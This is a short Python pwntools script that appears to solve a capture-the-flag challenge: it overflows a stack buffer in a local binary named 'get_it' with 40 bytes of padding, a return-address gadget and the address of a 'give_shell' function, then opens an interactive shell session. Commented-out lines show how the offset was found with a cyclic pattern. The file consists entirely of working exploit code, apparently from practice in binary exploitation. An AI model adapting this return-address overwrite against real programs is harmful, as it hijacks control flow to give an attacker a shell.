#!/usr/bin/python3
import pwn
# run straight
e = pwn.context.binary = pwn.ELF("./get_it")
p = e.debug(gdbscript="source /home/nick/global/halfdisp.py"
    +"\nbreak *main"
    +"\nbreak *give_shell"
    +"\nc"
)
#p = e.process()
payload = b"A"*40
payload+=pwn.p64(0x004005c7)#ADDRESS TO ANY VALID ADDRESS!!!!
payload+=pwn.p64(0x004005b6)#Address to TARGET


#cyclicPattern = pwn.cyclic(100)
#p.sendline(cyclicPattern)
#resultCyclic = pwn.cyclic_find(0x6161616c6161616b)
#print(resultCyclic)
p.sendline(payload)
p.interactive()


